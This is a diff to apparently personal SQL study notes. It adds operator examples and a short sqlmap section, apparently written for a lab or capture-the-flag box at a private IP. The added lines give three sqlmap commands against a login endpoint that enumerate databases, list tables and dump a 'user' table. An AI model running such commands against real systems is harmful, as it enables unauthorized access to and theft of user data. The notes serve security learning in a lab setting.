@@ -76,3 +76,11 @@ Less Than or Equal to and Greater than or equal to operator
 >= compares if the expression with a given value is greater than or equal to the provided one
 SELECT * FROM books WHERE publsihed_date <= "2021-11-15";
 SELECT * FROM books WHERE publsihed_date >= "2021-11-15";
+
+SQLmap
+sqlmap -u 'http://10.10.186.193/ai/includes/user_login?email=test&password=test' --dbs --level=5
+this will find what db is available
+sqlmap -u 'http://10.10.186.193/ai/includes/user_login?email=test&password=test' -D ai --tables --level=5
+This looks into the ai table 
+sqlmap -u 'http://10.10.186.193/ai/includes/user_login?email=test&password=test' -D ai -T user --dump --level=5
+This give the information of what is inside the ai table
